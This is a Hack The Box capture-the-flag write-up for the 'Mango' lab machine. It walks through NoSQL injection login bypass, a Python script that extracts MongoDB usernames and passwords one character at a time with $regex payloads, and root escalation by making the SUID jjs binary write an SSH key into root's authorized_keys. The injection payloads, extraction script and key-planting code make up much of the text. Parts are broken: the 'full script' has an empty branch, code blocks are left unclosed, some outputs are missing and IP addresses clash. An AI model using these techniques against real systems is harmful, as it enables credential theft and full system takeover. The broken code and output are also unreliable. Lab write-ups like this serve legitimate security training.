# HTB CTF - Mango

## Box information

Mango is a medium difficulty Linux machine hosting a website that is found vulnerable to NoSQL injection. 
The NoSQL database is discovered to be MongoDB, from which we exfiltrate user credentials. We can use one set of credentials to gain a foothold using SSH, and the other to move laterally within the box.
A SUID binary is then exploited to escalate our privileges to root. 

## Enumeration
### Port Scan

As always, we will start by scanning for all open TCP ports.

```console
0ph3@parrot~$ nmap -p- --min-rate=5000 10.10.10.162
Nmap scan report for 10.10.11.222
Host is up (0.11s latency).
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  ssl/https
```
Once we have a list of open ports, we can run more enumeration scripts against open services.
Doing the version and default script scan separately will save time and reduce the overall network traffic.

```console
0ph3@parrot~$ nmap -p 22,80,443 -sC -sV 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.056s latency).

```

Only three ports appear to be open. It's worth noting the nmap enumeration script found the staging-order subdomain name for mango.htb in the ssl cert's CommonName.
Let's add both mango.htb and staging-order.mango.htb to our attacking machine's ```/etc/hosts``` file.
We could have also found this by inspecting the certificate from within the browser. It's always a good idea to inspect ssl certs as they may contain subdomains or even potential usernames.

![](/assets/img/posts/HTB/Mango/Cert.png)

It's also worth noting both web services are running on the same version of Apache 2.4.29. If they were different, it could mean we are dealing with containerized instances.

### SSH (22/TCP)
The ssh service itself isn't usually exploitable and OpenSSH 7.6p1 doesn't have any known exploits we can take advantage of at the time of writing this.
However, it may have misconfigurations that allow for other attacks like brute forcing. It can also be of used to gain access to the machine if we manage
to find valid username and credentials from the other running services.
For now we will move on to the http/https web services which usually provide a larger attack surface depending on the web application hosted. 

### https (443/TCP)
Navigating to either ```https://10.10.10.162``` or ```https://staging-order.mango.htb``` directs us to what appears to be a search engine made to look like the Google Search page.
The search functionality does not seem to return any data regardless of what is sent. No command injection,SQLi or NoSQLi payloads seem to affect the results returned or behavior of the server.

![](/assets/img/posts/HTB/Mango/MongoSearchHTTPS.png)

There is a link to the /analytics.php page in the top right corner.
However, it only seems to provide static data which is displayed in a series of charts and graphs using the Flexmonster javascript component.

![](/assets/img/posts/HTB/Mango/MangoHttpsAnalytics.png)

Directory busting the website only fnds the ```https://mango.htb/server-status``` page but navigating to it results in a 403 Forbidden error.

There does not seem to be anythng useful hosted on the web applcation hosted on 443/TCP. We can move on to inspecting the web service on 80/TCP.

### http (80/TCP)
Navigating  to ```http://10.10.10.162``` returns a 403 Forbidden status code.
However, using the subdomain found in the certificate, ```http://staging-order.mango.htb```,  directs us to the login page.

![](/assets/img/posts/HTB/Mango/MangoLogin.png)

Trying some default credentials like ```admin:admin``` or ```admin:password``` leads nowhere unfortunately.
Before trying a brute force attack, we can see if it is possible to use any injection payloads to bypass authentication.
We can narrow down what injection payloads to test by thinking about the application's stack and how authentication is being performed.
From our scans, we know this is a Linux server, running Apache and we know from the page extensions it is using php. 
If we assume a database is being used for authentication, it is very likely the application stack being used is Linux, Apache, MySQL, PHP (LAMP) or Linux, Apache, MongoDB, PHP (LAMP with Mongo).

SQLi authentication bypass payloads don't seem work aganst the login page. 
The application is either correctly santizing user input or it is using a NoSQL Mongo database instead. 
Before we try any NoSQL injection payloads, let's review how NoSQL injections work.

### MongoDB and NoSQL Injection
Unlike a relational database like MySQL, which uses standard tables with rows and columns to store data, a NoSQL MongoDB database stores data in collections using BSON (Binary JSON) key-pair values.
A MongoDB database will have databases that contain collections which hold key-pair values. So for authentication, there could be a database that contains a ```users``` collection which holds data for each user.

```javascript
{
  "_id": "ObjectId(5d8e25334f3bf1432628927b)",
  "username": "user",
  "password": "Sup3rS3cretP@ssw0rd!"
}
```

The query used on the backend to verify credentials using a```<username>```  and ```<password>``` value might look like:
```javascript
db.users.find({
    username: "<username>",
    password: "<password>"
});
```

If the php application does not sanitize user input when creating a new database query, an adversary could inject an object that causes the query to always returns true, effictivly bypassing authentication
```php
$client = new MongoDB\Client("mongodb://localhost:27017");
$collection = $client->mango->users;
$user = $collection->find(array("username"=>$_POST['username'],"password"=>$_POST['password']));
```

With unsanitized input from the above query, we can use the ```$ne``` operator to inject a comparison object, ```{$ne: "invalid"}```, causing the search result for the username and password return as ```true``` and return all values. The applcaton would then authenticate  us as the first user in the database collection.
```javascript
db.users.find({
    username: {$ne: "invalid"},
    password: {$ne: "invalid"}
});
```
### Testing the Login for NoSQLi
Armed with a basic understanding of how NoSQLi authentication bypass attacks work, we can intercept the authentication request and try injecting a payload to get us in.

![](/assets/img/posts/HTB/Mango/InitialLoginRequest.png)

Depending on the Content-Type of the data being sent to the server, we might have to change how we inject our payload. The login request to the php web applcation is using a ```Content-Type``` of ```application/x-www-form-urlencoded```, so we cannot just pass the ```{$ne: "invalid"}``` json data directly into the parameters . We will have to edit the syntax of the url-encoded parameters to pass in our object. 

We can achieve this by changing the username and password parameters as ```username[$ne]=invalid``` and ```password[$ne]=invalid```

![](/assets/img/posts/HTB/Mango/BurpSQLinjectionSend.png)

Once we send the request with our injection payload, we get logged in and redirected to ```/home.php```.
However, there is no functionality available to us once logged in to the web application, we only get a message that the site is still under construction.

![](/assets/img/posts/HTB/Mango/UnderPlantation.png)


Directory busting with our new session cookie doesn't result in any useful pages opening up. 
This may seem lke a dead end but there is still more we can do with the NoSQL injection vulnerability.

## User foothold 
### Blind Boolean NoSQLi Exfiltration
It is possible to use the NoSQLi vulnerability we found to exfiltrate all username and passwords in the database's user collection.
Our payload ```{$ne: "invalid"}``` made the authentication query always return true for both the username and password, allowing us to login.
We could also build a payload that only returns true and logs us in if the username matches a regular expression pattern.
Effectively, we can exfiltrate the username one character at a time depending if the pattern tested results in a sucessful authentication

This can be acheived by injecting the ```$regex``` as the operator in our comparison object instead of ```$ne```
For example, injecting the following payload ```username=[$regex]=^a.*&password=invalid}```  will log us in if the username starts with the letter 'a'.
The resulting query will look something like:
```javascript
db.users.find({
    username: {$regex: "^a.*"},
    password: {$ne: "invalid"}
});
```

We can repeat this, appending valid characters to the regex pattern, until we finally extract the full username.
Once we have a valid username, we can extract the respective password using the same method and the following payload ``````username=validusername&password[regex]=^a.*}``````
The resulting query will look something like:
```javascript
db.users.find({
    username: "admin",
    password: {$regex: "^a.*"}
});
```
### Extracting Admin Username
If we remember, we found ```admin@mango.htb``` in the email address field of the ssl cert.
We can therefore start by trying the letter 'a'  as the frst character in our regex pattern in the username.

![](/assets/img/posts/HTB/Mango/StartsWithAuser.png)

The request results in a ```302 Found``` redirect to ```/home.php``` which indicates a successful login. We can therefore conclude there is a username that starts with the letter 'a'.
The full ```admin``` username is eventually extracted by appending valid characters for each subsequent character of username. So ```username[$regex]=^ad.*``` would be the next valid request. 
We could have also just inserted the admin password to confirm our suspicions about the admin username being a valid user wth this payload ```username=admin&password[$ne]=invalid&login=login```. 
> Note that for user enumeration, you could also fuzz for valid usernames using a wordlist and the following request payload ```username=FUZZ&password[$ne]=invalid``` with ffuf or burp intruder.
{: .prompt-info }

Now that we have ```admin``` as a valid username, we can use the same method to extract the password. Doing this manually is possible but it would take too much time and effort. Instead, we will build a python script to automate extracting all users and passwords from the MongoDB collection.

### Building a script to automate user exfiltration

Let's start by building a generic ```oracle``` function that will test if our injection payload results in sucessful authenticaton. The oracle functon will return true if the server's response data to our login request contains a specific string, ```tstring```, that indicates authentication was sucessful. In our case ```Under Plantation``` is a string that appears in the page after a sucessful login. 

The request data that is sent will be based on the target field we are trying to exfiltrate
<ul>
  <li>Extract username: <b>username[$regex]=^PAYLOAD.*&password[$ne]=x&login=login</b></li>
  <li>Extract Password: <b>username='VALIDUSER'&password[$regex]=^PAYLOAD.*&login=login</b></li>
</ul>

```python
def oracle(payload, tstring, target_param='username', validuser=''):

    #Our data and injection point for the request will change based on whether we are extracting the username or password.
    if target_param == 'username':

        data = 'username[$regex]=^'+quote_plus(payload)+'.*&password[$ne]=x&login=login'

    elif target_param == 'password':

        data = 'username='+ quote_plus(validuser) +'&password[$regex]=^'+quote_plus(payload)+'.*&login=login'

    #Make a request to the server using the data defined above
    response = requests.post(
        url='http://10.10.10.162/', 
        headers={"Host": "staging-order.mango.htb", "Content-Type": "application/x-www-form-urlencoded"}, 
        data=data
    )
    #return True if authentication was successful
    if tstring in response.text:
        return True
```

Next, let's build a ```findUsername()``` function that will iterate through all alphanumerical ascii characters to extract all usernames in the database. 
An empty ```username``` is initially passed into the function and each time the oracle function finds a valid character, it recursively calls the function passng in the username value + the valid character  until the full username is extracted. Each time a valid character is found, the functon uses the following payload to check if the current username value s the full username
```username=<CURRENT-USERNAME>&password[$ne]=invalid```.

```python

def findUsername(username):  

    for i in string.ascii_letters + string.digits:
        print("Fuzzing Username: %s%s" % (username, i), end='\r')
        if oracle(username + i, "Under Plantation"):
            #Test if username string is the full username
            r = requests.post(
                url='http://10.10.10.162/', 
                headers={"Host": "staging-order.mango.htb", "Content-Type": "application/x-www-form-urlencoded"}, 
                data='username='+username + i +'&password[$ne]=x&login=login'
            )
            if "Under Plantation" in r.text:
                print("\x1b[2K", end="\r")
                print("Username Found!: %s" % (username + i))
                findPassword(username + i)
                break
            findUsername(username + i)
```

Once a valid username is found, it will be passed to ```findPassword()``` which will attempt to extract the password for the specified user.
The function extracts the password by passing the valid username to the oracle function while setting the ```target_parameter``` to ```password``` to change the request data to use our payload to target the password field.

```python
def findPassword(username, password=''):     
    while True:
        for i in string.ascii_letters + string.digits + string.punctuation:
            if i in {"?","*", "+", ".","\\", "|"}:
                continue
            print("Fuzzing Password: %s%s" % (password, i), end='\r')
            if oracle(password + i, "Under Plantation", target_param='password', validuser=username):
                password += i
                #Check if full password has been found.
                r = requests.post(
                    url='http://10.10.10.162/', 
                    headers={"Host": "staging-order.mango.htb", "Content-Type": "application/x-www-form-urlencoded"}, 
                    data='username='+username+'&password='+ password +'&login=login'
                )
                if "Under Plantation" in r.text:
                    print("\x1b[2K", end="\r")
                    print("Password Found!: %s\n" % (password))
                    return password
                break
```


Here is the full script:
```python
import requests
import string
from urllib.parse import quote_plus

def oracle(payload, tstring, target_param='username', user=''):
    
    if target_param == 'username':

    elif target_param == 'password':

        data = 'username='+ quote_plus(user) +'&password[$regex]=^'+quote_plus(payload)+'.*&login=login'


    response = requests.post(
        url='http://10.10.10.162/', 
        headers={"Host": "staging-order.mango.htb", "Content-Type": "application/x-www-form-urlencoded"}, 
        data=data
    )
    if tstring in response.text:
        return True


def findUsername(username):  

    for i in string.ascii_letters + string.digits:
        print("Fuzzing Username: %s%s" % (username, i), end='\r')
        if oracle(username + i, "Under Plantation"):
            #Test if username string is the full username
            r = requests.post(
                url='http://10.10.10.162/', 
                headers={"Host": "staging-order.mango.htb", "Content-Type": "application/x-www-form-urlencoded"}, 
                data='username='+username + i +'&password[$ne]=x&login=login'
            )
            if "Under Plantation" in r.text:
                print("\x1b[2K", end="\r")
                print("Username Found!: %s" % (username + i))
                findPassword(username + i)
                break
            findUsername(username + i)
        
            
def findPassword(username, password=''):     
    while True:
        for i in string.ascii_letters + string.digits + string.punctuation:
            if i in {"?","*", "+", ".","\\", "|"}:
                continue
            print("Fuzzing Password: %s%s" % (password, i), end='\r')
            if oracle(password + i, "Under Plantation", target_param='password', user=username):
                password += i
                r = requests.post(
                    url='http://10.10.10.162/', 
                    headers={"Host": "staging-order.mango.htb", "Content-Type": "application/x-www-form-urlencoded"}, 
                    data='username='+username+'&password='+ password +'&login=login'
                )
                if "Under Plantation" in r.text:

                    return password

Runnng the script extracts a total of two users from the database.

### Connecting as mango via SSH

While the the ```admin``` credentials don't seem to get us an SSH connection, we are able to connect to the server as the ```mango``` user.
```console
0ph3@parrot~$ ssh mango@10.10.10.162                                             
mango@10.10.10.162's password:                                           
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)                                                                                
<SNIP>                                                                                       
mango@mango:~$ id
uid=1000(mango) gid=1000(mango) groups=1000(mango)
```
There doesn't seem to be a user.txt flag in ```/home/mango``` but we can notice an ```admin``` user is present and has an interactive shell set.
```console
mango@mango:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
mango:x:1000:1000:mango:/home/mango:/bin/bash
admin:x:4000000000:1001:,,,:/home/admin/:/bin/sh
```
### Using database credentials to login as admin
Trying the credentials extracted from the database against the admin user gets us logged in as the ```admin``` user.
We can find the ```user.txt``` in ```/home/admin``` directory.
```console
mango@mango:~$ su admin
Password:

## Privilege Escalation

### Enumeration
No easy sudo wins here
```console
admin@mango:~$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
admin@mango:~$ sudo -l
[sudo] password for admin: 
Sorry, user admin may not run sudo on mango.
```
### SUID

While going through the rest of the usual post exploitation enumeration steps, we can find a ```jjs``` binary that has the SUID set for the admin group.
This means we can run the binary as the root user.
```console
admin@mango:/home/mango$ find / -perm -4000 -user root -ls 2>/dev/null | grep -v /snap

### Using jjs SUID permissions to gain SSH as root
Results for ```jjs``` on [GTFOBins](https://gtfobins.github.io/gtfobins/) shows that the binary essentially allows us to run java code, which we could use to read, write and download files as root or even establish a reverse shell. 
We have several options here but let's try using our elevated write capabilities to gain access as the root user.
If the ssh server is misconfigured to allow login as root, we can generate an ssh key-pair and use ```jjs``` SUID privileges to write our public key to the root user's ```authorized_keys``` file, effectively allowing us to authenticated as the root user via ssh using our private key.

The ssh config at ```/etc/ssh/sshd_config``` reveals that the ssh is configured to allow logins as root.
```console
admin@mango:/home/mango$ cat /etc/ssh/sshd_config | grep PermitRoot
PermitRootLogin yes
# the setting of "PermitRootLogin without-password".
```
The next step would be to generate ssh keys we will use to write our public key to /root/.ssh/authorized_keys
```console
0ph3@parrot~$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/0ph3/.ssh/id_rsa): ./sshkeys/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:CG/kIikaomQJolfUzuBsGGZCJRcZ/wIa6Vax8VtNfMU root@parrot
The key's randomart image is:
+---[RSA 3072]----+
|.o.B=.  ..  o.   |
|. BoB . o. . E   |
|o* Oo*.. ..      |
|= *o==*.         |
|=B+..o=.S        |
|B+ . o.          |
|o                |
|                 |
|                 |
+----[SHA256]-----+

0ph3@parrot~$ ls
id_rsa  id_rsa.pub
```
On the server, let's create a file named ```exploit``` containing the following java code to write our ssh key to ```/root/.ssh/authorized_keys```
```java
var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCr7wiDT8rjb5tVEVyYmTAGsl96AbPjel7SMUOkVCimnpSbxDjRcC4DAOUyE+XLbqNwd8DGiEugcfr/B2ZSsfeEH6BtTkUj3Zd8pE/rZKYnAgikPZOKofuVPIAeep4bUojJoAhT8pxA+gUhY4AcKTRceE4QdDYOg3+/pAYR+cCmEFQ/KITDPEO3Nkj0kQb/SR0aev+GiKwH+xzrNaKpsb/ENisayZ+95OYHxsiUW9WZejkVLgaC2cJxG2S+GqnCEfTZEAm8Tn5gxbleaXsCPXtEDzYB97vPFpjxiKHxI0sLhcEATG+TI26FuB0P+xm6HTQfRZXYHF4tWPYvBqFvV8uI42oTDtVII4YWDAN4EQ+gVea6j84t6Rcx63Aekvtv0cT9YZTf/aP34RJyTXOaUIWEm4R2Wqpq3DxLX7bTNDlvi2qer2OQnJge6+uVp/z36b6ynkq0nVxwVwaCLDVOmmtrNb+d/AAA/AYZOFUlZqPaOXviVzRaoCD+O7NENaN30lc= 0ph3@parrot");
fw.close();
```

To run the code,  type ```jjs``` followed by the name of the file
```console
admin@mango:/home/admin$ jjs payload 
Warning: The jjs tool is planned to be removed from a future JDK release
admin@mango:/home/admin$
```

We are now able to connect as root via ssh to the server using our private key.
Once logged in as root, retrieve the flag in ```/root/root.txt``` !
```console
0ph3@parrot~$ chmod 600 id_rsa                                                   
0ph3@parrot~$ ssh -i id_rsa root@10.10.10.162

>Remember to use ```chmod 600 id_rsa``` to restrict permissions on your private key, otherwise ssh will throw an error when trying to use it for authentication.
